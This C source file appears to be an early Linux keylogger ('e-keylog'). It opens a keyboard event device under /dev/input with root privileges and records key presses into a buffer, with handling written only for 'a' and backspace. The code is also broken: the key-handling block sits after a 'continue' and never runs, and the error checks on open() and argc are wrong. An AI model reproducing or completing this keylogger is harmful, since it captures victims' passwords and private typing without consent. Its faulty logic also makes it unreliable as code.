
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>
#include <string.h>
#include <sys/stat.h>

typedef  struct{
  char wrds[4096];
  size_t len;
} storage_t;
storage_t logi = { .len=0 };

int main(int argc, char *argv[]){
  if(argc<1){
    printf("use -h for help\n");
  }
  //help flag
  int help=0;
  for(int i =1; i < argc; i++){
    if(strcmp(argv[i], "-h") ==0){
      help=1;
      printf("use sudo ./e-keylog /dev/input/by-path/platform-i8042-serio-0-event-kbd");
    
    }
  }

   int fd = open(argv[1], O_RDONLY, 0);
   if(!fd){
     perror("open fd");
     return 1;
   }
   struct input_event ie;
   while(read(fd, &ie, sizeof(ie))){
     if(ie.type !=EV_KEY || ie.value != 1){
       continue;
       if(ie.code == KEY_BACKSPACE){
         if(logi.len > 0){
           logi.len--;
           logi.wrds[logi.len] = '\0';
           printf("\b \b");
           fflush(stdout);
         }
       }
       
       else if(ie.code == KEY_A){
         if(logi.len < 4095){
           logi.wrds[logi.len++] = 'a';
           printf("a");
           fflush(stdout);
         }
       }
     }
   }  
    
return 0;
   }
